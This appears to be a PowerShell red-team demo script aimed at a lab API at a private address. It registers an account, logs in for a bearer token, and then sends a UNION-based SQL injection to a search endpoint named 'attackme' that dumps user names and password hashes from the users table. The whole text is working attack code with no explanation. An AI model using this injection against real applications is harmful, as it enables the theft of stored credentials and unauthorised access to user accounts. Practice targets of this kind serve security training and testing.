[System.Net.ServicePointManager]::Expect100Continue = $false
 
$body = @{ username = "attaquant_demo"; password = "RedTeam#2026" } | ConvertTo-Json
Invoke-RestMethod -Uri "http://192.168.137.1:8080/api/auth/register" -Method Post -ContentType "application/json" -Body $body
 
$token = (Invoke-RestMethod -Uri "http://192.168.137.1:8080/api/auth/login" -Method Post -ContentType "application/json" -Body $body).access_token
$token
 
$payload = "SUCCESS' UNION SELECT NULL, username, NULL, NULL, NULL, password_hash, NULL, NULL FROM users--"
$uri = "http://192.168.137.1:8080/api/attackme/search?q=" + [uri]::EscapeDataString($payload)
Invoke-RestMethod -Uri $uri -Headers @{ Authorization = "Bearer $token" } | Format-Table
